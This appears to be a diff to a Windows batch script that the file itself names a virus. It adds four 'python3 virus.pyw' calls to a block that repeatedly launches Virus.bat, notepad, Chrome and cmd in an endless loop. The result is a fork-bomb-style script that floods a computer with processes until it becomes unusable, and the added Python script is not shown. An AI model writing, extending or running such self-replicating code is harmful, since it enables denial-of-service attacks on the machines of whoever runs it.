@@ -23,12 +23,16 @@ goto starter
 
 :starter
 start Virus.bat
+python3 virus.pyw
 start notepad.exe
 start chrome.exe
+python3 virus.pyw
 start cmd.exe
 start Virus.bat
+python3 virus.pyw
 start chrome.exe
 start notepad.exe
+python3 virus.pyw
 start cmd.exe
 start Virus.bat
 goto loop
